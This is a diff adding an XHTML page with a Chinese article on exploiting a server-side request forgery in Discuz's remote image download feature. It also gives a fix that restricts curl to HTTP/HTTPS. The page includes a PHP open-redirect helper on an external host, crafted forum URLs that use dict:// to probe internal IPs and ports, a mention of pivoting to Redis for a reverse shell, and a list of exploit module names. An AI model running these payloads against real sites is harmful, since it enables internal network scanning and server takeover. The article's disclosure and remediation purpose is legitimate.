@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>SSRF到GET SHELL</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>SSRF到GET SHELL</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247483780&amp;idx=1&amp;sn=b18859d84bfbd79d675e7afbd36e9ac9&amp;chksm=eb668487dc110d91caa13bb83c3dad0ac5b6744c9ccdd57b8da18df0e341778896accab41ec0&amp;scene=126&amp;sessionid=1681407401#rd">http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247483780&amp;idx=1&amp;sn=b18859d84bfbd79d675e7afbd36e9ac9&amp;chksm=eb668487dc110d91caa13bb83c3dad0ac5b6744c9ccdd57b8da18df0e341778896accab41ec0&amp;scene=126&amp;sessionid=1681407401#rd</a></blockquote><p>漏洞影响</p><p>只要有一处SSRF（此处用Discuz代替），既有可能造成GET SHELL，获取服务器所有权限。</p><p>Discuz的一处SSRF</p><p>Discuz代码中存在一处远程下载图片的action <br/>source/module/forum/forum_ajax.php</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">if(preg_match('/^(http:\/\/|\.)/i', $imageurl)) {  
+    $content = dfsockopen($imageurl);
+} elseif(preg_match('/^('.preg_quote(getglobal('setting/attachurl'), '/').')/i', $imageurl)) {
+    $imagereplace['newimageurl'][] = $value[0];
+}</code></pre><p>如果$imageurl是http开头的，则使用dfsockopen远程访问该链接的图片。</p><p>那么就可以通过301跳转到一个内网服务上，用来探测内网信息。</p><p>构造探测图片</p><p>通过构造一个远程的伪图片</p><pre class=""><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">http://ttt.sssie.com/301.php  </code></pre><p>301.php</p><pre class=""><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">&lt;?php
+
+$ip = $_GET['ip'];
+
+$port = $_GET['port'];
+
+$scheme = $_GET['s'];
+
+$data = $_GET['data'];
+
+header("Location: $scheme://$ip:$port/$data");
+
+?&gt;</code></pre><p>构造一个跳转到dict://10.11.2.220:80/helo.jpg</p><pre class=""><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">http://ttt.sssie.com/301.php?s=dict&amp;ip=10.11.2.220&amp;port=80&amp;data=helo.jpg  </code></pre><p>我们让其301到一个内网ip的80端口，然后根据整个请求完成的时间不同来判定该服务是否存在，构造链接如下</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.220%26port=80%26data=helo.jpg[/img]
+
+http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.221%26port=80%26data=helo.jpg[/img]  </code></pre><p>上面链接请求10.11.2.220的80服务只需要100ms，10.11.2.221不存在80服务，返回使用了6s</p><p>GETSHELL</p><p>除了能探测80服务，我们还可以通过dict协议来探测内网匿名redis服务以及写redis拿到反弹shell dict://10.11.2.220:6379</p><p>探测FTP ftp://10.11.2.220:21</p><p>其它服务利用方式</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">redis.py  
+jboss.py  
+shellshock.py  
+axis2.py  
+jdwp.py  
+smtp.py  
+confluence.py  
+jenkins.py  
+struts.py  
+couchdb.py  
+mongodb.py  
+tftp.py  
+docker.py  
+phpcgi.py  
+tomcat.py  
+elasticsearch.py  
+pop.py  
+webdav.py  
+ftp.py  
+portscan.py  
+websphere.py  
+gopher.py  
+pstack.py  
+zentaopms.py  
+hfs.py  </code></pre><p>解决方案</p><p>大部分请求外部资源底层都是基于curl，curl默认支持dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp这些协议</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">$ curl -V
+curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  
+Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  
+Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets  </code></pre><p>所以只需要通过配置curl禁止使用除http/https以外其它协议即可解决该问题</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">source/function/function_filesock.php  </code></pre><p>在_dfsockopen方法内增加</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);  </code></pre><p>验证修复</p><p>在一台内网服务器(10.11.2.220)上开启一个8080端口</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">python -m SimpleHTTPServer 8080  </code></pre><p>然后访问触发SSRF的地址</p><pre><code style="font-family: Inconsolata, monospace, sans-serif; font-size: inherit; white-space: pre-wrap; border: none; border-radius: 2px; background: transparent;">http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.220%26port=8080%26data=helo.jpg[/img]  </code></pre><p>查看是否有请求的回显，没有则说明修复好了</p><p><br/></p>
+        
+</body>
+</html>
